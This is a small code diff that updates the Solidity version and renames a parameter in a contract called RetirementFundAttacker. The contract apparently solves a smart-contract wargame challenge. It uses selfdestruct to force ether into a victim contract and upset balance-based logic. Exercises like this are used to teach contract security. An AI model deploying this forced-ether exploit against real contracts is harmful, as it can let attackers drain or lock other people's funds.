@@ -1,9 +1,8 @@
-pragma solidity ^0.7.3;
-
+pragma solidity ^0.8.9;
 contract RetirementFundAttacker {
-    
-    constructor (address payable target) payable {
+
+    constructor (address payable victimAddress) payable {
         require(msg.value > 0);
-        selfdestruct(target);
+        selfdestruct(victimAddress);
     }
 }
